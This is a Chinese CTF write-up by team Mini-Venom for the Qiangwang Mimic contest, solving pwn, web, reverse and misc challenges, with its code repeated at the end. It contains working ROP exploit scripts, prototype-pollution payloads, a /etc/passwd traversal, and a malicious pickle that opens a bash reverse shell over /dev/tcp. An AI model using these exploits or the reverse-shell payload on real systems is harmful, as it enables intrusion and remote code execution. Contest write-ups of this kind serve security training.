# 第七届强网拟态 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/211170.html
> ID: 211170

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

Pwn

signin

这个函数纯在栈溢出，打ret2libc_orw即可

from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :
u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :
u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./vuln')
p=remote("pwn-0a25f7a133.challenge.xctf.org.cn", 9999, ssl=True)
elf = ELF('./vuln')
libc = ELF('libc.so.6')
#gdb.attach(p,'b *0x4014b1')
s(b'a'*0x12)
from ctypes import *
cdll=CDLL('libc.so.6')
cdll.srand(1633771873)
 

for i in range(100):
        sa('Input the authentication code:n',p64(cdll.rand()%100+1))

pop_rdi = 0x0000000000401893
ret = 0x000000000040101a

#debug('b *0x4012a0')
#p.interactive()
#gdb.attach(p,'b *0x4013c0')
sa(b'>> n',p32(1))
sa(b'Index: ',p32(1))
sa(b'Note: ',b'a'*8)

pause()

s(b'a'*0x100+p64(0x404000+0x100) + p64(pop_rdi) + p64(elf.got['read']) + p64(elf.sym["puts"]) + p64(0x4013C0))
pause()
p.recv(1)
libc_base = uu64()-libc.sym["read"]
system, binsh = get_sb()
lg('libc_base',libc_base)

pause()
rax = libc_base + 0x0000000000036174
syscall = libc_base + next(libc.search(asm('syscall; ret;')))
rdi = libc_base + 0x0000000000023b6a
rsi = libc_base +0x000000000002601f
rdx_r12 = libc_base +0x0000000000119211
mprotect = libc_base + libc.sym['mprotect']
open_ = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
buf = 0x4040D0
flag = 0x4042a0

payload = b'b'*0x108

# write flag

payload += p64(rdx_r12)+p64(0x300)+p64(0) + p64(read)
print(hex(len(payload)))
r()
s(payload)

pause()
payload = b'a'*0x128
# read flag -> buf
payload += p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(8)*2 + p64(read)
# open flag
payload += p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(open_)
# read flag
payload += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x30)*2 + p64(read)
# write flag
payload += p64(rdi) + p64(1) + p64(write)

s(payload)
pause()
sleep(1)
s(b'/flag')
pause()
#pause()
inter()

challenge

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote()
#p = process('./pwn')

rdi=0x0000000000401393
rl("lets move and pwn!")
payload=b'a'*(0x100+8)+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4012F0)
#bug()
s(payload)

libc_base=get_addr64()-libc.sym['puts']
pr(hex(libc_base))

rdi = libc_base+0x0000000000023b6a
rsi = libc_base+0x000000000002601f
rdx = libc_base+0x0000000000142c92
rdx_r12=libc_base+0x0000000000119211
rax = libc_base+0x0000000000036174
ret = libc_base+0x0000000000022679
syscall=libc_base+0x000000000002284d
open_=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
mprotect=libc_base + libc.sym['mprotect']
bss=0x404060+0x500
rl("lets move and pwn!")
payload=b'a'*(0x100)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(0x4012EE)
#bug()
s(payload)
pause()
orw  = b'/flagx00x00x00'
orw += p64(rdi) + p64(bss)  #/flag的字符串位置，要改
orw += p64(rsi) + p64(0)
orw += p64(open_)

orw += p64(rdi) + p64(3)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(bss+0x200) #读入flag的位置
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(bss+0x200) #读入flag的位置
orw += p64(write)

pr(hex(len(orw)))
s(orw)

inter()       

 Web

ez_pickle

审计源码发现就是需要 amdin 才能上传文件，在/register 存在原型链污染，污染 key 进行 jwt 伪造

{"__init__":{"__globals__":{"secret_key":"111"}}}

然后发现 pickle 反序列化存在 find
class 的 waf，通过污染白名单进行绕过

{
    "__init__" : {
        "__globals__" : {
            "safe_names" :["getattr","system","dict","globals"]
        }
    }
}

{
    "__init__" : {
        "__globals__" : {
            "safe_modules" : "builtins"
        }
    }
}

# 给定的字节数据
a='''cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRp1
cbuiltins
getattr
(g1
S'eval'
tR(S'__import__("os").system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'")'
tR.'''.encode()

# 文件名
filename = '111.pkl'

# 打开文件并以二进制写入模式写入字节
with open(filename, 'wb') as f:
    f.write(a)

print(f"字节数据已成功写入到文件: {filename}")

最后上传文件反弹 shell 得到flag

capoo

源码：

##showpic.php源码
<?php
class CapooObj {
    public function __wakeup()
    {
        $action = $this->action;
        $action = str_replace(""", "", $action);
        $action = str_replace("'", "", $action);
        $banlist = "/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|~|`|r|n|t|        |^|ls|.|tail|watch|wget|||;|:|(|)|{|}|*|?|[|]|@|\|=|<)/i";
        if(preg_match($banlist, $action)){
                die("Not Allowed!");
        }
        system($this->action);
    }
}
header("Content-type:
text/html;charset=utf-8");
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) {
    $file = $_POST['capoo'];
    
    if (file_exists($file)) {
        $data = file_get_contents($file);
        $base64 = base64_encode($data);
    } else if (substr($file, 0, strlen("http://")) === "http://") {
        $data = file_get_contents($_POST['capoo'] . "/capoo.gif");
        if (strpos($data, "PILER") !== false) {
                die("Capoo piler not allowed!");
        }
        file_put_contents("capoo_img/capoo.gif", $data);
        die("Download Capoo OK");
    } else {
        die('Capoo does not exist.');
    }
} else {
    die('No capoo provided.');
}
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Display Capoo</title>
  </head>
  
    ' />
  
</html>

非预期：

capoo=capoo_img/../../../../../../etc/passwd 可读文件

读start.sh可得flag文件名字，直接读flag

 Crypto

XOR

 Reverse

Serv1ce

直接看到java层的MyService
主要逻辑就是对初始的key进行扩展后再到native层验证输入

其中唯一不确定的参数就是num

看到native层，就是一个异或和乘法

直接模拟生成key后爆破求解

enc = [0xB9, 0x32, 0xC2, 0xD4, 0x69, 0xD5, 0xCA, 0xFB, 0xF8, 0xFB, 0x80, 0x7C, 0xD4, 0xE5, 0x93, 0xD5, 0x1C, 0x8B, 0xF8, 0xDF, 0xDA, 0xA1, 0x11, 0xF8, 0xA1, 0x93, 0x93, 0xC2, 0x7C, 0x8B, 0x1C, 0x66, 0x01, 0x3D, 0xA3, 0x67]

key = b"1liIl11lIllIIl11llII"
key1 = [0]*36

for i in range(36):
    key1[i] = (key[i%len(key)] - 0x77 ^ 23)&0xff
print(key1)

for i in range(36):
    for j in range(0x20, 0x7f):
        tmp = (j^key1[i])*11
        tmp &= 0xff
        if tmp == enc[i]:
            print(chr(j), end = '')

easyre

大量的花指令，但程序不是很大，可直接调试出程序的加密逻辑

一些逻辑

取数据

密文对比

其实就是异或和xtea加密

#include <stdio.h>  
#include <stdint.h>  
  
void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {  
    unsigned int i;  
    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;  
    for (i=0; i < num_rounds; i++) { 
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
                sum += delta;     
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);  
    }  
    v[0]=v0; v[1]=v1;  
}  
  
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {  
    unsigned int i;  
    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;  
    for (i=0; i < num_rounds; i++) {  
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);  
        sum -= delta;  
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);  
    }  
    v[0]=v0; v[1]=v1;  
}  
  
int main()  
{  
    uint32_t const k[4]={0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624};  
    
        unsigned char enc[] = {0x6D,0xBD,0x86,0x96,0x80,0x5A,0x51,0xE5,0xCC,0xFF,0x9F,0x6C,0x56,0x5A,0x38,0xA7,0x45,0x4B,0xDC,0x2B,0x49,0x6A,0xF0,0x31,0xA2,0x95,0xB8,0xDD,0xF3,0xEF,0x9A,0x58,0x23,0xFC,0x90,0xFA,0x1F,0x52,0x86,0xD1,0x49,0x72,0xA4,0x89,0x42,0x68,0xD7,0x69,0xF8,0xFC,0x63,0x24,0x26,0x73,0xB2,0x9B, 0x0};
        unsigned int r = 102;
        for(int i = 0; i < 7; i++)
        {
                decipher(r, ((unsigned int *)enc)+2*i, k);        
        }
        
                for(int i = 0; i < 56; i++)
        {
                printf("%#x, ", enc[i]);
        }
        

        putchar(10);
    return 0;  
}  

最后再找出异或数据即可

enc = [0xd9, 0xd3, 0xde, 0xd8, 0xc4, 0xca, 0xe0, 0xde, 0xcd, 0xc, 0xe0, 0xcd, 0xda, 0xff, 0xe, 0xe, 0xc6, 0xe0, 0xd8, 0xf, 0xf, 0xdb, 0xe0, 0xff, 0xcb, 0xe0, 0xf, 0xe, 0xe, 0xc9, 0xd2, 0xe0, 0xdb, 0xda, 0xf, 0xdd, 0xd9, 0xe0, 0xde, 0xd1, 0xdb, 0xe0, 0xde, 0xd1, 0xcb, 0xd6, 0xe0, 0xdb, 0xda, 0xdd, 0xca, 0xd8, 0xd8, 0xda, 0xcd, 0xc2]
x = [191]*56
x = [191, 191, 191, 191, 191, 191, 191, 191, 191, 63, 191, 191, 191, 191, 63, 63, 191, 191, 191, 63, 63, 191, 191, 191, 191, 191, 63, 63, 63, 191, 191, 191, 191, 191, 63, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191]
tmp = enc[:]
for j in range(56):
    tmp[j] ^= x[j]
print(bytes(tmp))

 Misc

Find way to read video

BV1wm2EY2Egx eyJ2IjozLCJuIjoiZjE0ZyIsInMiOiIiLCJoIjoiZjczZDEyZCIsIm0iOjkwLCJrIjo4MSwibWciOjIwMCwia2ciOjEzMCwibCI6NDMsInNsIjoxLCJmaGwiOlsiMjUyZjEwYyIsImFjYWM4NmMiLCJjYTk3ODExIiwiY2QwYWE5OCIsIjAyMWZiNTkiLCIyYzYyNDIzIiwiNGUwNzQwOCIsIjRlMDc0MDgiLCJjYTk3ODExIiwiMmU3ZDJjMCIsIjZiODZiMjciLCIzZjc5YmI3IiwiNGUwNzQwOCIsIjM5NzNlMDIiLCJkNDczNWUzIiwiNGIyMjc3NyIsIjc5MDI2OTkiLCJlN2Y2YzAxIiwiMzk3M2UwMiIsIjRiMjI3NzciLCI0YjIyNzc3IiwiNmI4NmIyNyIsIjJlN2QyYzAiLCIzOTczZTAyIiwiY2E5NzgxMSIsIjNmNzliYjciLCI0ZTA3NDA4IiwiZDQ3MzVlMyIsIjM5NzNlMDIiLCIzZjc5YmI3IiwiM2Y3OWJiNyIsIjI1MmYxMGMiLCIzZjc5YmI3IiwiNmI4NmIyNyIsIjE4YWMzZTciLCI1ZmVjZWI2IiwiNGUwNzQwOCIsIjE4YWMzZTciLCIxOGFjM2U3IiwiMTk1ODFlMiIsIjNmNzliYjciLCJkMTBiMzZhIiwiMDFiYTQ3MSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNzdhZGZjOSIsImRlN2QxYjciLCI0NGJkN2FlIiwiYmI3MjA4YiIsIjgzODkxZDciLCIyYTBhYjczIiwiZmUxZGNkMyIsIjU1OWFlYWQiLCJmMDMxZWZhIl19

第一个是b站视频

好像是莫斯码

第二个base解码

{"v":3,"n":"f14g","s":"","h":"f73d12d","m":90,"k":81,"mg":
200,"kg":
130,"l":43,"sl":1,"fhl":["252f10c","acac86c","ca97811","cd0aa98","021fb59","2c62423","4e07408","4e07408","ca97811","2e7d2c0","6b86b27","3f79bb7","4e07408","3973e02","d4735e3","4b22777","7902699","e7f6c01","3973e02","4b22777","4b22777","6b86b27","2e7d2c0","3973e02","ca97811","3f79bb7","4e07408","d4735e3","3973e02","3f79bb7","3f79bb7","252f10c","3f79bb7","6b86b27","18ac3e7","5feceb6","4e07408","18ac3e7","18ac3e7","19581e2","3f79bb7","d10b36a","01ba471","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","77adfc9","de7d1b7","44bd7ae","bb7208b","83891d7","2a0ab73","fe1dcd3","559aead","f031efa"]}

ezflag

流量包提取压缩包，然后后缀改png得到flag

pvz

先创个0到1000的md5值字典爆破密码，

import hashlib

def calculate_md5(number):
    # 将数字转换为字符串
    num_str = str(number)
    # 创建md5对象
    md5_obj = hashlib.md5()
    # 更新md5对象，传入数字字符串的字节形式
    md5_obj.update(num_str.encode('utf-8'))
    # 获取16进制的md5值
    md5_value = md5_obj.hexdigest()
    return md5_value

# 打开一个文件用于写入
with open('md5_values.txt', 'w') as file:
    # 遍历0到1000，计算每个数字的MD5值并写入文件
    for i in range(1001):
        md5_value = calculate_md5(i)
        file.write(f"{md5_value}n")

然后打开zip，补全二维码，扫码得到：

D'`_q^K![YG{VDTveRc10qpnJ+*)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@"&gt;76Z:
321U54-21*Non,+*#G'&amp;%$d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^WUZSwWVUNrRQ3IHGLEiCBAFE&gt;=aA:9&gt;765:
981Uvu-2+O/.nm+$Hi'~}|B"!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:
921U/u3,+*Non&amp;%*)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k

然后搜索知道是malbolge编程语言，

在线网站直接解了，

https://www.tutorialspoint.com/execute_malbolge_online.php

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *
from struct import pack
from ctypes import *
import base64
    #from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :
u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :
u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./vuln')
p=remote("pwn-0a25f7a133.challenge.xctf.org.cn", 9999, ssl=True)
elf = ELF('./vuln')
libc = ELF('libc.so.6')
    #gdb.attach(p,'b *0x4014b1')
s(b'a'*0x12)
from ctypes import *
cdll=CDLL('libc.so.6')
cdll.srand(1633771873)
 

for i in range(100):
        sa('Input the authentication code:n',p64(cdll.rand()%100+1))

pop_rdi = 0x0000000000401893
ret = 0x000000000040101a

    #debug('b *0x4012a0')
    #p.interactive()
    #gdb.attach(p,'b *0x4013c0')
sa(b'>> n',p32(1))
sa(b'Index: ',p32(1))
sa(b'Note: ',b'a'*8)

pause()

s(b'a'*0x100+p64(0x404000+0x100) + p64(pop_rdi) + p64(elf.got['read']) + p64(elf.sym["puts"]) + p64(0x4013C0))
pause()
p.recv(1)
libc_base = uu64()-libc.sym["read"]
system, binsh = get_sb()
lg('libc_base',libc_base)

pause()
rax = libc_base + 0x0000000000036174
syscall = libc_base + next(libc.search(asm('syscall; ret;')))
rdi = libc_base + 0x0000000000023b6a
rsi = libc_base +0x000000000002601f
rdx_r12 = libc_base +0x0000000000119211
mprotect = libc_base + libc.sym['mprotect']
open_ = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
buf = 0x4040D0
flag = 0x4042a0

payload = b'b'*0x108

# write flag

payload += p64(rdx_r12)+p64(0x300)+p64(0) + p64(read)
print(hex(len(payload)))
r()
s(payload)

pause()
payload = b'a'*0x128
# read flag -> buf
payload += p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(8)*2 + p64(read)
# open flag
payload += p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(open_)
# read flag
payload += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x30)*2 + p64(read)
# write flag
payload += p64(rdi) + p64(1) + p64(write)

s(payload)
pause()
sleep(1)
s(b'/flag')
pause()
    #pause()
inter()
from pwn import*
from struct import pack
import ctypes
    #from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
    #def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
    #context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   
    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
    #libc=ELF('libc-2.23.so') 
    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote()
    #p = process('./pwn')

rdi=0x0000000000401393
rl("lets move and pwn!")
payload=b'a'*(0x100+8)+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4012F0)
    #bug()
s(payload)

libc_base=get_addr64()-libc.sym['puts']
pr(hex(libc_base))

rdi = libc_base+0x0000000000023b6a
rsi = libc_base+0x000000000002601f
rdx = libc_base+0x0000000000142c92
rdx_r12=libc_base+0x0000000000119211
rax = libc_base+0x0000000000036174
ret = libc_base+0x0000000000022679
syscall=libc_base+0x000000000002284d
open_=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
mprotect=libc_base + libc.sym['mprotect']
bss=0x404060+0x500
rl("lets move and pwn!")
payload=b'a'*(0x100)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(0x4012EE)
    #bug()
s(payload)
pause()
orw  = b'/flagx00x00x00'
orw += p64(rdi) + p64(bss)  #/flag的字符串位置，要改
orw += p64(rsi) + p64(0)
orw += p64(open_)

orw += p64(rdi) + p64(3)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(bss+0x200) #读入flag的位置
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(bss+0x200) #读入flag的位置
orw += p64(write)

pr(hex(len(orw)))
s(orw)

inter()
{"__init__":{"__globals__":{"secret_key":"111"}}}
{
    "__init__" : {
        "__globals__" : {
            "safe_names" :["getattr","system","dict","globals"]
        }
    }
}

{
    "__init__" : {
        "__globals__" : {
            "safe_modules" : "builtins"
        }
    }
}
# 给定的字节数据
a='''cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRp1
cbuiltins
getattr
(g1
S'eval'
tR(S'__import__("os").system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'")'
tR.'''.encode()

# 文件名
filename = '111.pkl'

# 打开文件并以二进制写入模式写入字节
with open(filename, 'wb') as f:
    f.write(a)

print(f"字节数据已成功写入到文件: {filename}")
##showpic.php源码
<?php
class CapooObj {
    public function __wakeup()
    {
        $action = $this->action;
        $action = str_replace(""", "", $action);
        $action = str_replace("'", "", $action);
        $banlist = "/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|~|`|r|n|t|        |^|ls|.|tail|watch|wget|||;|:|(|)|{|}|*|?|[|]|@|\|=|<)/i";
        if(preg_match($banlist, $action)){
                die("Not Allowed!");
        }
        system($this->action);
    }
}
header("Content-type:
text/html;charset=utf-8");
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) {
    $file = $_POST['capoo'];
    
    if (file_exists($file)) {
        $data = file_get_contents($file);
        $base64 = base64_encode($data);
    } else if (substr($file, 0, strlen("http://")) === "http://") {
        $data = file_get_contents($_POST['capoo'] . "/capoo.gif");
        if (strpos($data, "PILER") !== false) {
                die("Capoo piler not allowed!");
        }
        file_put_contents("capoo_img/capoo.gif", $data);
        die("Download Capoo OK");
    } else {
        die('Capoo does not exist.');
    }
} else {
    die('No capoo provided.');
}
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Display Capoo</title>
  </head>
  
    ' />
  
</html>
enc = [0xB9, 0x32, 0xC2, 0xD4, 0x69, 0xD5, 0xCA, 0xFB, 0xF8, 0xFB, 0x80, 0x7C, 0xD4, 0xE5, 0x93, 0xD5, 0x1C, 0x8B, 0xF8, 0xDF, 0xDA, 0xA1, 0x11, 0xF8, 0xA1, 0x93, 0x93, 0xC2, 0x7C, 0x8B, 0x1C, 0x66, 0x01, 0x3D, 0xA3, 0x67]

key = b"1liIl11lIllIIl11llII"
key1 = [0]*36

for i in range(36):
    key1[i] = (key[i%len(key)] - 0x77 ^ 23)&0xff
print(key1)

for i in range(36):
    for j in range(0x20, 0x7f):
        tmp = (j^key1[i])*11
        tmp &= 0xff
        if tmp == enc[i]:
            print(chr(j), end = '')
    #include <stdio.h>  
    #include <stdint.h>  
  
void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {  
    unsigned int i;  
    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;  
    for (i=0; i < num_rounds; i++) { 
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
                sum += delta;     
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);  
    }  
    v[0]=v0; v[1]=v1;  
}  
  
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {  
    unsigned int i;  
    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;  
    for (i=0; i < num_rounds; i++) {  
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);  
        sum -= delta;  
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);  
    }  
    v[0]=v0; v[1]=v1;  
}  
  
int main()  
{  
    uint32_t const k[4]={0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624};  
    
        unsigned char enc[] = {0x6D,0xBD,0x86,0x96,0x80,0x5A,0x51,0xE5,0xCC,0xFF,0x9F,0x6C,0x56,0x5A,0x38,0xA7,0x45,0x4B,0xDC,0x2B,0x49,0x6A,0xF0,0x31,0xA2,0x95,0xB8,0xDD,0xF3,0xEF,0x9A,0x58,0x23,0xFC,0x90,0xFA,0x1F,0x52,0x86,0xD1,0x49,0x72,0xA4,0x89,0x42,0x68,0xD7,0x69,0xF8,0xFC,0x63,0x24,0x26,0x73,0xB2,0x9B, 0x0};
        unsigned int r = 102;
        for(int i = 0; i < 7; i++)
        {
                decipher(r, ((unsigned int *)enc)+2*i, k);        
        }
        
                for(int i = 0; i < 56; i++)
        {
                printf("%#x, ", enc[i]);
        }
        

        putchar(10);
    return 0;  
}
enc = [0xd9, 0xd3, 0xde, 0xd8, 0xc4, 0xca, 0xe0, 0xde, 0xcd, 0xc, 0xe0, 0xcd, 0xda, 0xff, 0xe, 0xe, 0xc6, 0xe0, 0xd8, 0xf, 0xf, 0xdb, 0xe0, 0xff, 0xcb, 0xe0, 0xf, 0xe, 0xe, 0xc9, 0xd2, 0xe0, 0xdb, 0xda, 0xf, 0xdd, 0xd9, 0xe0, 0xde, 0xd1, 0xdb, 0xe0, 0xde, 0xd1, 0xcb, 0xd6, 0xe0, 0xdb, 0xda, 0xdd, 0xca, 0xd8, 0xd8, 0xda, 0xcd, 0xc2]
x = [191]*56
x = [191, 191, 191, 191, 191, 191, 191, 191, 191, 63, 191, 191, 191, 191, 63, 63, 191, 191, 191, 63, 63, 191, 191, 191, 191, 191, 63, 63, 63, 191, 191, 191, 191, 191, 63, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191]
